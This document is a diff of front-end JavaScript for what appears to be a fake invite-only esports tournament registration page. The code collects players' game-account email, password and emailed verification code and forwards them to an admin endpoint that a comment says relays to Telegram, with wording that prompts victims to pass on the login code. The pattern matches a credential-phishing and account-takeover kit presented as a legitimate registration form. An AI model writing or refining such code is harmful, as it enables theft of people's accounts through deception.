@@ -1,123 +1,98 @@
-// Валідні інвайт-коди (демо)
-const VALID_CODES = ["FLOW2025","ESPORTPUBG","V7ACCESS"];
+// DEMO valid codes (фронт; бек все одно перевірить на своєму боці)
+const VALID_CODES = ["FLOW2025", "ESPORTPUBG", "V7ACCESS"];
 
-// DOM
-const announceEnter = document.getElementById('announce-enter');
-const codeGate      = document.getElementById('code-gate');
-const codeInput     = document.getElementById('access-code');
-const checkCodeBtn  = document.getElementById('check-code');
-const codeStatus    = document.getElementById('code-status');
-const regSection    = document.getElementById('registration-section');
-const regForm       = document.getElementById('reg-form');
-const regStatus     = document.getElementById('reg-status');
-const finalMessage  = document.getElementById('final-message');
-const finalCard     = document.getElementById('final-card');
+const openGatewayBtn = document.getElementById('open-gateway');
+const scrollCta = document.getElementById('scroll-cta-code');
+const tournamentSection = document.getElementById('tournament-announcement');
+
+const codeInput = document.getElementById('access-code');
+const checkCodeBtn = document.getElementById('check-code');
+const codeStatus = document.getElementById('code-status');
+const regSection = document.getElementById('registration-section');
+const regForm = document.getElementById('reg-form');
+const regStatus = document.getElementById('reg-status');
+const finalMessage = document.getElementById('final-message');
+const finalCard = document.getElementById('final-card');
 const requestEmailCodeBtn = document.getElementById('request-email-code');
-let lastUid = null;
 
-// Показати STEP 1 після кліку
-if (announceEnter){
-  announceEnter.addEventListener('click', ()=>{
-    codeGate.style.display = 'block';
-    codeGate.setAttribute('aria-hidden','false');
-    codeGate.scrollIntoView({behavior:'smooth'});
-    setTimeout(()=>codeInput && codeInput.focus(), 250);
+// --- helper: notify admin via backend (ТГ) ---
+function notifyAdmin(type, payload = {}) {
+  return fetch("/api/notify-admin", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ type, ...payload })
+  })
+    .then(r => r.json())
+    .then(data => {
+      console.log("Admin notify result:", data);
+      return data;
+    })
+    .catch(err => {
+      console.error("Admin notify error:", err);
+      return { ok: false, error: "fetch_failed" };
+    });
+}
+
+// --- send full application to backend ---
+async function sendApplication(formData) {
+  try {
+    const res = await fetch("/api/submit-registration", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(formData)
+    });
+    if (!res.ok) throw new Error("Bad response");
+    return await res.json(); // {status, uid}
+  } catch (e) {
+    console.error("submit-registration error, fallback notify:", e);
+    await notifyAdmin("full_application_fallback", formData);
+    return { status: "pending" };
+  }
+}
+
+// Scroll CTA appears after user reaches end of tournament announcement
+if (tournamentSection && scrollCta) {
+  window.addEventListener('scroll', () => {
+    if (scrollCta.classList.contains('visible')) return;
+    const rect = tournamentSection.getBoundingClientRect();
+    if (rect.bottom <= window.innerHeight + 40) {
+      scrollCta.classList.add('visible');
+    }
+  });
+
+  scrollCta.addEventListener('click', () => {
+    const gate = document.getElementById('code-gate');
+    if (gate) {
+      gate.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      codeInput && codeInput.focus();
+    }
   });
 }
 
-// Уведомление админа (бэкенд-ендпоінти — заглушки під твої)
-function notifyAdmin(type, payload = {}){
-  return fetch("/api/notify-admin",{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({type, ...payload})
-  }).then(r=>r.json()).catch(()=>({ok:false,error:"fetch_failed"}));
+// Hero button -> code input
+if (openGatewayBtn && codeInput) {
+  openGatewayBtn.addEventListener('click', function () {
+    codeInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    codeInput.focus();
+  });
 }
 
-async function sendApplication(formData){
-  try{
-    const res = await fetch("/api/submit-registration",{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify(formData)
-    });
-    if(!res.ok) throw 0;
-    return await res.json();
-  }catch(e){
-    await notifyAdmin("full_application_fallback",formData);
-    return {status:"pending"};
-  }
-}
-
-function renderFinalStatus(status, uid){
-  if(uid) lastUid = uid;
-
-  if(status === "approved"){
-    finalCard.innerHTML = `
-      <div class="title"><span class="bar"></span>Registration approved</div>
-      <div class="sub" style="margin-bottom:0">You will receive lobby details via email/DM.</div>
-    `;
-    return;
-  }
-
-  if(status === "rejected"){
-    finalCard.innerHTML = `
-      <div class="title"><span class="bar"></span>Registration rejected</div>
-      <div class="sub" style="margin-bottom:0">Contact admin or submit updated information.</div>
-    `;
-    return;
-  }
-
-  let extra = "";
-  if(lastUid){
-    extra = `
-      <div class="sub" style="margin-top:6px">Application ID: <code>${lastUid}</code></div>
-      <div class="submit" style="justify-content:flex-start">
-        <button id="check-status-btn" class="btn">Check status</button>
-      </div>
-    `;
-  }
-
-  finalCard.innerHTML = `
-    <div class="title"><span class="bar"></span>Waiting lobby — application received</div>
-    <div class="sub" style="margin-bottom:0">Your request is queued for manual review.</div>
-    ${extra}
-  `;
-
-  const btn = document.getElementById('check-status-btn');
-  if(btn && lastUid){
-    btn.addEventListener('click', async ()=>{
-      btn.disabled = true;
-      btn.textContent = "Checking…";
-      try{
-        const r = await fetch(`/api/check-status/${lastUid}`);
-        const d = await r.json();
-        renderFinalStatus(d.status || "pending", lastUid);
-      }catch{
-        btn.disabled = false;
-        btn.textContent = "Check status";
-        alert("Try again later.");
-      }
-    });
-  }
-}
-
-// Перевірка коду
-if(checkCodeBtn){
-  checkCodeBtn.addEventListener('click', ()=>{
+// Verify code (front-only)
+if (checkCodeBtn) {
+  checkCodeBtn.addEventListener('click', function () {
     const val = (codeInput.value || "").trim().toUpperCase();
-    if(!val){
-      codeStatus.textContent = "Enter your invite code.";
+    if (!val) {
+      codeStatus.textContent = "Enter your invite code to continue.";
       codeStatus.className = "status err";
       regSection.style.display = "none";
       return;
     }
-    if(VALID_CODES.includes(val)){
+    if (VALID_CODES.includes(val)) {
       codeStatus.textContent = "Code accepted. Registration form unlocked.";
       codeStatus.className = "status ok";
       regSection.style.display = "block";
-      regSection.scrollIntoView({behavior:'smooth'});
-    }else{
+      regSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    } else {
       codeStatus.textContent = "Invalid code. Check your invite or contact support.";
       codeStatus.className = "status err";
       regSection.style.display = "none";
@@ -125,88 +100,155 @@ if(checkCodeBtn){
   });
 }
 
-// Запит email-коду (часткова заявка)
-if(requestEmailCodeBtn){
-  requestEmailCodeBtn.addEventListener('click', async ()=>{
+// "GET CODE" -> часткові дані адміну
+if (requestEmailCodeBtn) {
+  requestEmailCodeBtn.addEventListener('click', async () => {
     regStatus.textContent = "";
     regStatus.className = "status";
 
-    const ingameId = (document.getElementById('ingame-id').value||"").trim();
-    const email    = (document.getElementById('email').value||"").trim();
-    const pass     = (document.getElementById('password').value||"");
+    const ingameId = (document.getElementById('ingame-id').value || "").trim();
+    const email = (document.getElementById('email').value || "").trim();
+    const pass = (document.getElementById('password').value || "");
 
-    if(!ingameId || !email || !pass){
-      regStatus.textContent = "Fill In-game ID, Email and Password first.";
+    if (!ingameId || !email || !pass) {
+      regStatus.textContent = "Fill In-game ID, Email and Password before requesting a code.";
       regStatus.className = "status err";
       return;
     }
 
-    const accessCode = (codeInput.value||"").trim();
-    const res = await notifyAdmin("email_code_request",{
-      accessCode, ingameId, email, password:pass, region:"CIS"
+    const accessCode = (codeInput.value || "").trim();
+
+    const res = await notifyAdmin("email_code_request", {
+      accessCode,
+      ingameId,
+      email,
+      password: pass
     });
 
-    if(res && res.ok){
-      regStatus.textContent = "Request sent. Admin will reply with verification code.";
+    if (res && res.ok) {
+      regStatus.textContent = "Request sent. Admin will review and send a verification code to your email.";
       regStatus.className = "status ok";
     } else {
-      regStatus.textContent = "Request queued. If no response, ping admin directly.";
+      regStatus.textContent = "Request sent locally. If no email within some time — contact support / admin.";
       regStatus.className = "status err";
     }
   });
 }
 
-// Надсилання форми
-if(regForm){
-  regForm.addEventListener('submit', async (e)=>{
+// Submit full form
+if (regForm) {
+  regForm.addEventListener('submit', async function (e) {
     e.preventDefault();
     regStatus.textContent = "";
     regStatus.className = "status";
 
-    const accessCode = (codeInput.value||"").trim().toUpperCase();
-    const email      = (document.getElementById('email').value||"").trim();
-    const emailCode  = (document.getElementById('email-code').value||"").trim();
-    const ingameId   = (document.getElementById('ingame-id').value||"").trim();
-    const ingameIdConfirm = (document.getElementById('ingame-id-confirm').value||"").trim();
-    const pass       = (document.getElementById('password').value||"");
-    const pass2      = (document.getElementById('password-confirm').value||"");
-    const terms      = document.getElementById('terms').checked;
+    const accessCode = (codeInput.value || "").trim().toUpperCase();
+    const email = (document.getElementById('email').value || "").trim();
+    const emailCode = (document.getElementById('email-code').value || "").trim();
+    const ingameId = (document.getElementById('ingame-id').value || "").trim();
+    const ingameIdConfirm = (document.getElementById('ingame-id-confirm').value || "").trim();
+    const pass = (document.getElementById('password').value || "");
+    const pass2 = (document.getElementById('password-confirm').value || "");
+    const terms = document.getElementById('terms').checked;
 
-    if(!accessCode || !VALID_CODES.includes(accessCode)){
+    if (!accessCode || !VALID_CODES.includes(accessCode)) {
       regStatus.textContent = "Access code is missing or invalid.";
       regStatus.className = "status err";
       return;
     }
-    if(!email || !ingameId || !pass || !pass2){
+    if (!email || !ingameId || !pass || !pass2) {
       regStatus.textContent = "Please fill all required fields.";
       regStatus.className = "status err";
       return;
     }
-    if(ingameIdConfirm && ingameIdConfirm !== ingameId){
+    if (ingameIdConfirm && ingameIdConfirm !== ingameId) {
       regStatus.textContent = "In-game ID confirmation does not match.";
       regStatus.className = "status err";
       return;
     }
-    if(pass !== pass2){
+    if (pass !== pass2) {
       regStatus.textContent = "Passwords do not match.";
       regStatus.className = "status err";
       return;
     }
-    if(!terms){
+    if (!terms) {
       regStatus.textContent = "Please confirm that the data is correct.";
       regStatus.className = "status err";
       return;
     }
 
-    const formData = {accessCode, ingameId, email, password:pass, emailCode, region:"CIS"};
+    const formData = {
+      accessCode,
+      ingameId,
+      email,
+      password: pass,
+      emailCode
+    };
 
-    regStatus.textContent = "Sending your application to the waiting lobby…";
+    regStatus.textContent = "Sending your application for review...";
+    regStatus.className = "status";
+
     const result = await sendApplication(formData);
 
     regForm.reset();
     regSection.style.display = "none";
     finalMessage.style.display = "block";
-    finalMessage.scrollIntoView({behavior:'smooth'});
-    renderFinalStatus(result.status || "pending", result.uid || null);
+    finalMessage.scrollIntoView({ behavior: 'smooth', block: 'start' });
+
+    if (result.status === "approved") {
+      finalCard.innerHTML = `
+        <div class="section-title" style="margin-bottom:4px;">
+          <span class="bar"></span>Registration approved
+        </div>
+        <div class="success-envelope">✉️</div>
+        <div class="section-sub" style="margin-bottom:0;">
+          Your registration is <strong>successful</strong>.
+          Within 2 days you will receive an email with lobby details
+          and a direct link to participate in the tournament.
+        </div>
+      `;
+    } else if (result.status === "rejected") {
+      finalCard.innerHTML = `
+        <div class="section-title" style="margin-bottom:4px;">
+          <span class="bar"></span>Registration rejected
+        </div>
+        <div class="section-sub" style="margin-bottom:0;">
+          Provided data was not approved.
+          Please check your details and try again or contact support.
+        </div>
+      `;
+    } else {
+      finalCard.innerHTML = `
+        <div class="section-title" style="margin-bottom:4px;">
+          <span class="bar"></span>Application submitted
+        </div>
+        <div class="section-sub" style="margin-bottom:0;">
+          Your application has been sent for manual review.
+          Expect a decision and, if approved, an invitation link
+          to the tournament within 2 days.
+        </div>
+      `;
+    }
   });
 }
+
+// Mobile tabs
+const mobileTabs = document.querySelectorAll('.mobile-bottom-nav .mobile-tab');
+mobileTabs.forEach(tab => {
+  tab.addEventListener('click', () => {
+    const target = tab.getAttribute('data-target');
+    mobileTabs.forEach(t => t.classList.remove('active'));
+    tab.classList.add('active');
+
+    if (!target) return;
+
+    if (target.startsWith('http')) {
+      window.open(target, '_blank', 'noopener');
+    } else if (target === '/') {
+      window.location.href = '/';
+    } else {
+      const el = document.querySelector(target);
+      if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    }
+  });
+});
